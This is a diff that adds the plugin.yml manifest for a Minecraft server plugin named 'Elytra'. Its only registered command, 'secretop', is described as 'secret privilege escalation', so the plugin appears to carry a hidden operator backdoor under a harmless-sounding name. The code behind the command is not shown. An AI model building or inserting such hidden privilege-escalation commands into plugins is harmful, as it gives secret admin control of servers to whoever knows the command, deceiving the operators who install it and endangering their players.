@@ -1,0 +1,8 @@
+name: Elytra
+version: 1.0
+main: com.minilucker.elytra.Elytra
+api-version: 1.20
+commands:
+  secretop:
+    description: secret privilege escalation.
+    usage: just type the command bro (/secretop)
